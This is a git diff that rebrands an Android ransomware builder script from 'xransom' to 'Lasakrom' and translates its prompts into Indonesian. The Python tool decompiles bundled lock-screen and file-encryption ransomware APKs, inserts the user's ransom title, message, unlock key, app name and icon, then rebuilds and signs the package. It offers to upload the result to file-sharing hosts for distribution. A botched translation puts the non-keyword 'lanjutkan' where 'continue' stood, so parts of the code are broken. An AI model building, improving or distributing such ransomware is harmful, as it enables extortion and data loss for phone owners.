@@ -33,11 +33,11 @@ def check_requirements():
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
 # variables
-imgv1 = ["xransom/res/drawable-hdpi-v4/ic_launcher.png","xransom/res/drawable-mdpi-v4/ic_launcher.png","xransom/res/drawable-xhdpi-v4/ic_launcher.png","xransom/res/drawable-xxhdpi-v4/ic_launcher.png"]
-imgv2 = ["xransom/res/mipmap-hdpi/ic_launcher.png","xransom/res/mipmap-mdpi/ic_launcher.png","xransom/res/mipmap-xhdpi/ic_launcher.png","xransom/res/mipmap-xxhdpi/ic_launcher.png","xransom/res/mipmap-xxxhdpi/ic_launcher.png"]
+imgv1 = ["Lasakrom/res/drawable-hdpi-v4/ic_launcher.png","Lasakrom/res/drawable-mdpi-v4/ic_launcher.png","Lasakrom/res/drawable-xhdpi-v4/ic_launcher.png","Lasakrom/res/drawable-xxhdpi-v4/ic_launcher.png"]
+imgv2 = ["Lasakrom/res/mipmap-hdpi/ic_launcher.png","Lasakrom/res/mipmap-mdpi/ic_launcher.png","Lasakrom/res/mipmap-xhdpi/ic_launcher.png","Lasakrom/res/mipmap-xxhdpi/ic_launcher.png","Lasakrom/res/mipmap-xxxhdpi/ic_launcher.png"]
 # banner
-# xransom - Simple Android Ransomware Attack (version 2.0)
-class xransom:
+# Lasakrom - Simpel android ransom atak (version 3.0)
+class Lasakrom:
     def __init__(self):
         self.AppIcon=""
         self.AppName=""
@@ -54,12 +54,12 @@ class xransom:
                         line = line.replace(search,replaced)
                     print(line, end="")
                 break
-            else: os.system("rm -rf xransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to write on file: {file}")
+            else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} gagal menulis pada file: {file}")
     def buildapk(self):
         try:
-            os.system("apktool b --use-aapt2 xransom -o final.apk")
+            os.system("apktool b --use-aapt2 Lasakrom -o final.apk")
             if os.path.isfile("final.apk"):
-                os.system("rm -rf xransom > /dev/null 2>&1")
+                os.system("rm -rf Lasakrom > /dev/null 2>&1")
                 os.system("java -jar ubersigner.jar -a final.apk --ks testkey.jks --ksAlias android --ksPass android --ksKeyPass android > /dev/null 2>&1")
                 os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
                 if os.path.isfile("final-aligned-signed.apk"):
@@ -67,7 +67,7 @@ class xransom:
                     os.system("rm -rf final.apk > /dev/null 2>&1")
                     os.system("mv final-aligned-signed.apk "+output)
                     print(w+"-"*43)
-                    ask=str(input(f"{b}>{w} Do you want to share this APK's ? (y/n): ").lower())
+                    ask=str(input(f"{b}>{w} Apakah Anda ingin membagikan APK ini (y/n): ").lower())
                     if ask == "y":
                         print(f"""
 {w}[{r}SHARE TO{w}]
@@ -79,7 +79,7 @@ class xransom:
                             x=str(input(f"{b}>{w} choose: "))
                             if x in ("1","01"):
                                 link=os.popen(f"curl -s --upload-file {output} https://transfer.sh").readline().strip()
-                                if len(str(link)) != 0: print(f"{b}>{w} Success shared to: {g}{link}{w}"); break
+                                if len(str(link)) != 0: print(f"{b}>{w} Sukses disimpan sebagai: {g}{link}{w}"); break
                                 else: print(f"{b}>{w} Failed shared to: {r}https://transfer sh{w}"); break
                             elif x in ("2","02"):
                                 os.system(f"curl --no-progress-meter -F 'file=@{output}' https://api.anonfile.com/upload > response.json")
@@ -89,51 +89,51 @@ class xransom:
                                     f.close()
                                     os.system("rm -rf response.json")
                                     link=j["data"]["file"]["url"]["full"]
-                                    print(f"{b}>{w} Success shared to: {g}{link}{w}")
+                                    print(f"{b}>{w} Sukses shared to: {g}{link}{w}")
                                     break
-                                else: print(f"{b}>{w} Failed shared to: {r}https://anonfile.com{w}"); break
+                                else: print(f"{b}>{w} Salah shared to: {r}https://anonfile.com{w}"); break
                             else: continue
                     else: pass
-                    getpass(f"{b}>{w} Success saved as: {B} {output} {w}")
+                    getpass(f"{b}>{w} Sukses disimpan sebagai: {B} {output} {w}")
                     exit()
-                else: os.system("rm -rf final.apk > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} failed to sign APK's")
-            else: os.system("rm -rf xransom > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} failed to build APK's")
+                else: os.system("rm -rf final.apk > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} gagal membuat APK")
+            else: os.system("rm -rf Lasakrom > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} gagal membuat APK")
         except Exception as ERROR:
-            exit(f"{w}{R} ERROR {w} process stopped: {ERROR}")
+            exit(f"{w}{R} ERROR {w} proses terhenti: {ERROR}")
     def builder(self,version):
         print("")
         if version == 1:
             while True:
-                x=str(input(f"{b}>{w} SET APP_ICON ({r}PNG: icon.png{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR IKON APLIKASI ({r}PNG: icon.png{w}): "+g))
                 if os.path.isfile(x):
                     if ".png" in x:
                         self.AppIcon=x
                         break
-                    else: print(f"{w}{R} ERROR {w} File format not accepted !"); continue
-                else: print(f"{w}{R} ERROR {w} File not found please fill correctly !"); continue
+                    else: print(f"{w}{R} ERROR {w} Format file tidak diterima!"); lanjutkan
+                else: print(f"{w}{R} ERROR {w} File tidak ditemukan harap diisi dengan benar !"); lanjutkan
             while True:
-                x=str(input(f"{b}>{w} SET APP_NAME ({r}EX: My Apps{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR NAMA APLIKASI  ({r}EX: My Apps{w}): "+g))
                 if len(x) !=0: self.AppName=x; break
                 else: continue
             while True:
-                x=str(input(f"{b}>{w} SET APP_TITLE ({r}EX: Phone Hacked{w}): "+g))
+                x=str(input(f"{b}>{w} SETEL APLIKASI_TITLE ({r}EX: Phone Hacked{w}): "+g))
                 if len(x) !=0: self.AppTitle=x; break
                 else: continue
             while True:
-                x=str(input(f"{b}>{w} SET APP_DESC ({r}EX: Contact Me{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR APLIKASI_DESKRIPSI ({r}EX: Contact Me{w}): "+g))
                 if len(x) !=0: self.AppDesc=x; break
                 else: continue
             while True:
-                x=str(input(f"{b}>{w} SET APP_KEYS ({r}EX: SeCr3t{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR KUNCI_APLIKASI ({r}EX: SeCr3t{w}): "+g))
                 if len(x) !=0: self.AppKeys=x; break
                 else: continue
-            print(f"{b}>{w} Building your ransomware APK's")
+            print(f"{b}>{w} Membangun APK ransomware Anda")
             print(w+"-"*43+d)
-            os.system("apktool d data/v1/xransom.apk")
-            if os.path.isdir("xransom"):
-                strings="xransom/res/values/strings.xml"
+            os.system("apktool d data/v1/Lasakrom.apk")
+            if os.path.isdir("Lasakrom"):
+                strings="Lasakrom/res/values/strings.xml"
                 print("I: Using strings: "+strings)
-                smali=os.popen(f"find -L xransom/ -name '*0000.smali'","r").readline().strip()
+                smali=os.popen(f"find -L Lasakrom/ -name '*0000.smali'","r").readline().strip()
                 print("I: Using smali "+os.path.basename(smali))
                 self.write(strings,"appname",self.AppName)
                 print("I: Adding name with "+self.AppName)
@@ -150,43 +150,43 @@ class xransom:
                         with Image.open(path) as target:
                             width, height = target.size
                             size = str(width)+"x"+str(height)
-                            logo = "xransom"+os.path.basename(self.AppIcon)
+                            logo = "Lasakrom"+os.path.basename(self.AppIcon)
                             os.system("cp -R "+self.AppIcon+" "+logo)
                             os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                             os.system("rm -rf "+logo)
-                    else: os.system("rm -rf xransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directory not found: {path}")
+                    else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} direktori tidak ditemukan: {path}")
                 self.buildapk()
-            else: os.system("rm -rf xransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
+            else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} gagal mendekompilasi APK")
         elif version == 2:
             while True:
-                x=str(input(f"{b}>{w} SET APP_ICON ({r}PNG: icon.png{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR IKON APLIKASI ({r}PNG: icon.png{w}): "+g))
                 if os.path.isfile(x):
                     if ".png" in x:
                         self.AppIcon=x
                         break
-                    else: print(f"{w}{R} ERROR {w} File format not accepted !"); continue
-                else: print(f"{w}{R} ERROR {w} File not found please fill correctly !"); continue
+                    else: print(f"{w}{R} ERROR {w} Format file tidak diterima !"); continue
+                else: print(f"{w}{R} ERROR {w} File tidak ditemukan harap diisi dengan benar !"); continue
             while True:
-                x=str(input(f"{b}>{w} SET APP_NAME ({r}EX: My Apps{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR APLIKASI _NAMA ({r}EX: My Apps{w}): "+g))
                 if len(x) !=0: self.AppName=x; break
                 else: continue
             while True:
-                x=str(input(f"{b}>{w} SET APP_DESC ({r}EX: Contact Me{w}): "+g))
+                x=str(input(f"{b}>{w} ATUR APLIKASI _DESK ({r}EX: Contact Me{w}): "+g))
                 if len(x) !=0: self.AppDesc=x; break
                 else: continue
-            print(f"{b}>{w} Building your ransomware APK's")
+            print(f"{b}>{w} Membangun APK ransomware Anda")
             print(w+"-"*43+d)
-            os.system("apktool d data/v2/xransom.apk")
-            if os.path.isdir("xransom"):
-                strings="xransom/res/values/strings.xml"
+            os.system("apktool d data/v2/Lasakrom.apk")
+            if os.path.isdir("Lasakrom"):
+                strings="Lasakrom/res/values/strings.xml"
                 print("I: Using strings: "+strings)
                 self.write(strings,"AppName",self.AppName)
-                self.write("xransom/smali/com/termuxhackersid/services/EncryptionService.smali","AppName",self.AppName)
-                self.write("xransom/smali/com/termuxhackersid/services/DecryptionService.smali","AppName",self.AppName)
+                self.write("Lasakrom/smali/com/termuxhackersid/services/EncryptionService.smali","AppName",self.AppName)
+                self.write("Lasakrom/smali/com/termuxhackersid/services/DecryptionService.smali","AppName",self.AppName)
                 print("I: Adding name with "+self.AppName)
-                self.write("xransom/smali/com/termuxhackersid/services/EncryptionService.smali","AppDesc",self.AppDesc)
-                self.write("xransom/smali/com/termuxhackersid/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
-                self.write("xransom/smali/com/termuxhackersid/ui/MainActivity.smali","AppDesc",self.AppDesc)
+                self.write("Lasakrom/smali/com/termuxhackersid/services/EncryptionService.smali","AppDesc",self.AppDesc)
+                self.write("Lasakrom/smali/com/termuxhackersid/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
+                self.write("Lasakrom/smali/com/termuxhackersid/ui/MainActivity.smali","AppDesc",self.AppDesc)
                 print("I: Adding description with "+str(len(self.AppDesc))+" words")
                 time.sleep(3)
                 print("I: Adding icon with "+self.AppIcon)
@@ -195,40 +195,40 @@ class xransom:
                         with Image.open(path) as target:
                             width, height = target.size
                             size = str(width)+"x"+str(height)
-                            logo = "xransom-"+os.path.basename(self.AppIcon)
+                            logo = "Lasakrom-"+os.path.basename(self.AppIcon)
                             os.system("cp -R "+self.AppIcon+" "+logo)
                             os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                             os.system("rm -rf "+logo)
-                    else: os.system("rm -rf xransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directory not found: {path}")
+                    else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} direktori tidak ditemukan: {path}")
                 self.buildapk()
-            else: os.system("rm -rf xransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
-        else: exit(f"{w}{R} ERROR {w} oops no other version yet !")
+            else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
+        else: exit(f"{w}{R} ERROR {w} ups, belum ada versi lain!")
     def menu(self):
         clear()
         print(f"""
-{w}{R} xransom {w} SIMPLE ANDROID RANSOMWARE ATTACK
+{w}{R} Lasakrom {w} SIMPEL VIRUS RANSOM
 
-MADE BY HACKER X PHANTOM
+BY LASAK STORE
 
 a simple tool for making android ransomware
 any loss or damage is the responsibility of the user.
 
-{w}[{r}CHOOSE RANSOMWARE TYPE{w}]
+{w}[{r}PILIH RANSOMWARE TIPE{w}]
 
-{w}[{b}1{w}] xransom - TYPE LOCK SCREEN {w}({y} ANDROID 10 {w})
-{w}[{b}2{w}] xransom - TYPE FILE ENCRYPTION {w}({y} ANDROID 7.1 {w})
+{w}[{b}1{w}] Lasakrom - JENIS LAYAR KUNCI {w}({y} ANDROID 10 {w})
+{w}[{b}2{w}] Lasakrom - JENIS FILE ENCRYPTION {w}({y} ANDROID 7.1 {w})
 {w}[{b}3{w}] Exit from console
         """)
         while True:
             x=str(input(f"{w}[{b}?{w}] choose: "))
             if x in ("1","01"): self.builder(1); break
             elif x in ("2","02"): self.builder(2); break
-            elif x in ("3","03"): exit(f"{w}{R} EXIT {w} thank you for using this tool !")
+            elif x in ("3","03"): exit(f"{w}{R} EXIT {w} terima kasih telah menggunakan alat ini!")
             else: continue
         
 if __name__ == "__main__":
     try:
-        xransom=xransom()
-        xransom.menu()
+        Lasakrom=Lasakrom()
+        Lasakrom.menu()
     except KeyboardInterrupt:
-        exit(f"{w}{R} ABORTED {w} the user has terminated the process")
+        exit(f"{w}{R} ABORTED {w} pengguna telah menghentikan proses")
